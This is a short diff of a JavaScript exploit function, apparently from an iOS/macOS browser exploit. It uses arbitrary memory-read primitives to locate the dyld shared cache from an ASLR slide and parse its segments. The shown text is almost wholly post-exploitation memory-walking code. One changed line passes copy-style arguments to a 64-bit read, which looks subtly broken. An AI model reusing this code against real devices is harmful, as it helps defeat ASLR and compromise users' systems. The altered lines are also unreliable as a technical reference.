@@ -501,7 +501,7 @@ function exploit(){
 	    log('[*] We will now walk down the code to find the illegal instruction for demo purposes...');
 	    tmp = base;
 	    var dcache_base = Add(0x180000000,slide);
-	    var magic =  memory.read_i64(dcache_base);
+	    var magic =  memory.read_i32(dcache_base);
 	    log('[+] Which has magic '+magic.toString(16));
 	   // memory.read_i32(magic);
 	    //log('magic = ' + magic);
@@ -511,7 +511,7 @@ function exploit(){
 	    var dcache_base_seg = null;
 	    var dcache_nsegs = memory.read_i32(dcache_base + 0x14);
         log('[+] The dyld shared cache seems to have '+dcache_nsegs+' segments.');
-	    var dcache_segdata = memory.copyfrom(Add(dcache_base, memory.u32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
+	    var dcache_segdata = memory.read_i64(Add(dcache_base, memory.u32(Add(dcache_base, 0x10))), 0, dcache_nsegs * 0x20);
 	    var dcache_segs = [];
 	    for(var i = 0; i < dcache_nsegs; i++){
 	    	var off = i * 0x20;
